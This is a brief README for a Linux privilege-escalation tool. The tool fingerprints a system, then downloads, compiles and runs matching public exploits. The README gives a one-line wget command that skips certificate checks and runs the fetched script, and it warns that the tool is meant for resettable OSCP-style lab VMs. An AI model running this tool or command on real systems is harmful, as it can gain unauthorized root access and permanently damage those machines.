# Elevator [![Build Status](https://travis-ci.org/guifre/Elevator.svg?branch=master)](https://travis-ci.org/guifre/Elevator.svg?branch=master) [![Coverage Status](https://coveralls.io/repos/github/guifre/Elevator/badge.svg?branch=master)](https://coveralls.io/github/guifre/Elevator?branch=master)

Elevator automates elevation of privileges in Linux systems. It fingerprints the operating system version, downloads, compiles, and executes the relevant exploits from `exploit-db`.

## Getting Started


```
wget --no-check-certificate https://raw.githubusercontent.com/guifre/Elevator/master/elevator.py; ./elevator.py
```

## WARNING
Executing this script will potentially download and run hundreds of exploits, which can cause permanent damage to the operating system.

This script is intended to facilitate EoP in OSCP like labs, do not run this anywhere else other than VMs that can be easily reset.